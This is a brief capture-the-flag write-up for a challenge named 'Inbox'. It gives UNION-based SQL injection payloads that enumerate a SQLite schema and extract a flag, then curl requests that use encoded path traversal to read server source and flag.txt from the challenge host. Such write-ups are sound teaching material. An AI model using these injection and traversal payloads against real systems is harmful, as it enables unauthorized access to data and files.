Inbox
First part:

# Two columns returned
' UNION SELECT 1, 2-- -
# We can now see anything
' UNION SELECT 1, (PAYLOAD)-- -
# The following lines correspond to PAYLOAD inserted in the line above

# Get full schema
SELECT group_concat(sql) FROM sqlite_schema
# Get tables
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type = 'table' and tbl_name NOT like 'sqlite_%'
# Get columns from flags
SELECT group_concat(sql) FROM sqlite_master WHERE type != 'meta' AND sql NOT NULL AND name = 'flags'
# Get flag
SELECT flag FROM flags

# 1st part = flag{off_to_a_good_start_



Second part:

# Show server source
curl 'https://thecybercoopctf-inbox.chals.io/mail/%2e%2e/index.js'
# List files
curl 'https://thecybercoopctf-inbox.chals.io/mail/%2e%2e/'
# Get flag
curl 'https://thecybercoopctf-inbox.chals.io/mail/%2e%2e/flag.txt'

# 2nd part = even_better_finish_though}


## flag{off_to_a_good_start_even_better_finish_though}